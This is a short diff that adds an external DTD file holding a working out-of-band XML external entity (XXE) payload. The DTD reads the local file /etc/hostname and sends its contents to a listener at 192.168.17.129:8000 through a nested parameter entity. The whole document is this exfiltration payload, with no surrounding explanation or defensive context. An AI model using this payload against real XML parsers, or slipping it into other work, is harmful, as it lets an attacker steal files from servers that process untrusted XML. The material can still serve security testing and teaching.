@@ -1,0 +1,4 @@
+<!ENTITY % data SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.17.129:8000/?stolen_data=%data;'>">
+%eval;
+%exfil;
